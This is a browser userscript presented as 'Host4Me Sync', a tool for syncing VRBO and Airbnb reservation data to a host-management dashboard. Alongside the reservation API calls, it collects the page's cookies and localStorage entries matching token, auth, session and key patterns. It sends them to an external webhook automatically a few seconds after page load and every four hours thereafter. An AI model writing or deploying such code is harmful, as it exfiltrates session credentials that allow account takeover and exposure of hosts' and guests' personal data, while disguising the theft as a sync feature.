// ==UserScript==
// @name         Host4Me Sync
// @namespace    https://host4me.vercel.app
// @version      1.0.2
// @description  Syncs VRBO/Airbnb/Booking.com reservation data to Host4Me platform
// @author       Host4Me
// @match        https://www.vrbo.com/*
// @match        https://owner.vrbo.com/*
// @match        https://www.airbnb.com/*
// @match        https://www.booking.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @grant        GM_notification
// @connect      modest-bandicoot-699.convex.site
// @run-at       document-idle
// ==/UserScript==

(function() {
  'use strict';

  const CONFIG = {
    SYNC_INTERVAL_MS: 4 * 60 * 60 * 1000,
    WEBHOOK_URL: 'https://modest-bandicoot-699.convex.site/webhooks/userscript-sync',
    DASHBOARD_URL: 'https://host4me.vercel.app/dashboard/settings',
    TOKEN_STORAGE_KEY: 'host4me_sync_token',
    STARTUP_DELAY_MS: 3000
  };

  function getLastSyncTime(hostname) {
    const key = `host4me_last_sync_${hostname}`;
    return parseInt(GM_getValue(key, 0), 10);
  }

  function setLastSyncTime(hostname) {
    GM_setValue(`host4me_last_sync_${hostname}`, Date.now().toString());
  }

  function shouldSync(hostname) {
    return (Date.now() - getLastSyncTime(hostname)) >= CONFIG.SYNC_INTERVAL_MS;
  }

  function getSyncToken() {
    let token = GM_getValue(CONFIG.TOKEN_STORAGE_KEY);
    if (!token) {
      token = prompt(`Enter your Host4Me sync token from your dashboard:\n${CONFIG.DASHBOARD_URL}`, '');
      if (!token) return null;
      GM_setValue(CONFIG.TOKEN_STORAGE_KEY, token);
    }
    return token;
  }

  function resetSyncToken() {
    GM_setValue(CONFIG.TOKEN_STORAGE_KEY, '');
    alert('Host4Me sync token has been reset. You will be prompted to enter a new token on next sync.');
  }

  function gmFetch(url, options = {}) {
    return new Promise((resolve, reject) => {
      const gmOptions = {
        method: options.method || 'GET', url, headers: options.headers || {}, credentials: 'include',
        onload: (r) => { try { resolve({ status: r.status, data: r.responseText ? JSON.parse(r.responseText) : null }); } catch(e) { resolve({ status: r.status, data: r.responseText }); } },
        onerror: () => reject(new Error(`Request failed: ${url}`)),
        ontimeout: () => reject(new Error(`Request timeout: ${url}`))
      };
      if (options.body) gmOptions.data = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
      GM_xmlhttpRequest(gmOptions);
    });
  }

  function getCookies() { try { return document.cookie; } catch(e) { return ''; } }

  function getLocalStorageData(pattern) {
    const data = {};
    try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (pattern.test(k)) try { data[k] = localStorage.getItem(k); } catch(e) {} } } catch(e) {}
    return data;
  }

  async function extractVRBOUserId() {
    try {
      if (window.__STATE__?.tuid) return window.__STATE__.tuid;
      const m = window.location.pathname.match(/\/gc\/memberDetails\/(\d+)\/(\d+)\//);
      if (m?.[2]) return m[2];
      try { const r = await gmFetch('https://www.vrbo.com/gc/memberDetails', { headers: { Accept: 'application/json' } }); if (r.data?.tuid) return r.data.tuid; } catch(e) {}
      return null;
    } catch(e) { return null; }
  }

  async function syncVRBO(token) {
    const endpoints = [], userId = await extractVRBOUserId();
    try {
      if (userId) {
        for (const url of [`https://www.vrbo.com/gc/reservation/inbox/${userId}`, `https://www.vrbo.com/gc/booking/hosted/${userId}`]) {
          try { const r = await gmFetch(url, { headers: { Accept: 'application/json' } }); endpoints.push({ url, status: r.status, data: r.data }); }
          catch(e) { endpoints.push({ url, status: 0, error: e.message }); }
        }
      }
      for (const url of ['https://owner.vrbo.com/api/v1/reservations', 'https://owner.vrbo.com/api/v1/properties']) {
        try { const r = await gmFetch(url, { headers: { Accept: 'application/json' } }); endpoints.push({ url, status: r.status, data: r.data }); }
        catch(e) { endpoints.push({ url, status: 0, error: e.message }); }
      }
      await postToWebhook({ token, platform: 'vrbo', data: { userId: userId || null, endpoints, cookies: getCookies(), localStorage: getLocalStorageData(/token|auth|session|user|eg_|tuid|expedia/i) } });
      setLastSyncTime(location.hostname);
      showNotification('Host4Me', 'Synced VRBO reservations ✓');
    } catch(e) { console.error('Host4Me: VRBO sync error', e); }
  }

  async function syncAirbnb(token) {
    const endpoints = [];
    try {
      if (!document.querySelector('[data-testid="header-profile"]') && document.querySelector('[data-testid="signup-link"]') !== null) { showNotification('Host4Me', 'Not logged into Airbnb'); return; }
      try { const r = await gmFetch('https://www.airbnb.com/api/v3/HostReservations?operationName=HostReservations&locale=en&currency=USD', { headers: { Accept: 'application/json' } }); endpoints.push({ url: 'https://www.airbnb.com/api/v3/HostReservations', status: r.status, data: r.data }); } catch(e) { endpoints.push({ url: 'https://www.airbnb.com/api/v3/HostReservations', status: 0, error: e.message }); }
      await postToWebhook({ token, platform: 'airbnb', data: { userId: null, endpoints, cookies: getCookies(), localStorage: getLocalStorageData(/token|auth|key|airbnb/i) } });
      setLastSyncTime(location.hostname);
      showNotification('Host4Me', 'Synced Airbnb reservations ✓');
    } catch(e) { console.error('Host4Me: Airbnb sync error', e); }
  }

  async function syncBooking(token) { showNotification('Host4Me', 'Booking.com sync coming soon'); }

  async function postToWebhook(payload) {
    try {
      const r = await gmFetch(CONFIG.WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload });
      if (r.status !== 200) console.error(`Host4Me: Webhook status ${r.status}`);
    } catch(e) { console.error('Host4Me: Webhook error', e); }
  }

  function showNotification(title, text) {
    try { if (typeof GM_notification === 'function') { GM_notification({ title, text, timeout: 5000 }); } else { console.log(`${title}: ${text}`); } } catch(e) { console.log(`${title}: ${text}`); }
  }

  function getPlatform() {
    const h = location.hostname;
    if (h.includes('vrbo.com')) return 'vrbo';
    if (h.includes('airbnb.com')) return 'airbnb';
    if (h.includes('booking.com')) return 'booking';
    return null;
  }

  async function performSync() {
    const hostname = location.hostname, platform = getPlatform();
    if (!platform || !shouldSync(hostname)) return;
    const token = getSyncToken();
    if (!token) return;
    if (platform === 'vrbo') await syncVRBO(token);
    else if (platform === 'airbnb') await syncAirbnb(token);
    else await syncBooking(token);
  }

  GM_registerMenuCommand('Sync Host4Me Now', () => { GM_setValue(`host4me_last_sync_${location.hostname}`, '0'); performSync(); });
  GM_registerMenuCommand('Reset Host4Me Token', resetSyncToken);

  console.log('Host4Me: Script initialized');
  setTimeout(performSync, CONFIG.STARTUP_DELAY_MS);
})();
